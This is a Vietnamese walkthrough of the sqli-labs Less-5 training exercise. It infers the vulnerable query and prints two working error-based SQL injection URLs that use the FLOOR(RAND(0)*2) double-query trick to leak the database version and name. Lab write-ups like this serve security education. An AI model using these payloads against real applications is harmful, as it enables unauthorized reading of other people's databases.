# Less 5

Yêu cầu nhập vào một ID

![](../images/sqli-labs/Less-5/07.png)

Thử nhập vào một giá trị

![](../images/sqli-labs/Less-5/1.png)

Tiếp tục thử để xuất hiện lỗi

![](../images/sqli-labs/Less-5/2.png)

Ta thấy ta có thể dự đoán câu query ở bên dưới

```
select * from table where id='$ID' limit 0,1
```

Ta có thể thử để pass qua 

![](../images/sqli-labs/Less-5/3.png)

Dựa vào đây ta có thể show ra các thông tin

```
http://192.168.84.233/sqli-labs/Less-5/?id=1' and (SELECT 0 FROM (SELECT count(*), CONCAT((select @@version, 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
```

![](../images/sqli-labs/Less-5/05.png)

```
http://192.168.84.233/sqli-labs/Less-5/?id=1' and (SELECT 0 FROM (SELECT count(*), CONCAT((select database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
```

![](../images/sqli-labs/Less-5/08.png)

Ta có thể khai thác giống với ở [Less-1](Less-1.md)